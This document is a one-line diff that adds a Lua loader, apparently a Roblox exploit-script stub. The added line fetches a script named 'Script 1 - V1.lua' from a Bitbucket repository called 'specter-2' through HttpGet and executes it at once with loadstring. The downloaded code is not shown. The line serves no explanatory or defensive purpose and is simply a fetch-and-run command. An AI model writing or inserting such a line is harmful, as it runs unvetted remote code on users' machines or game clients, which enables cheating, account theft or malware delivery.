@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://bitbucket.org/tnightmareha/specter-2/raw/217ec9adf62418a5514d0a8c53bd39864d1b9993/Script%201%20-%20V1.lua"))()
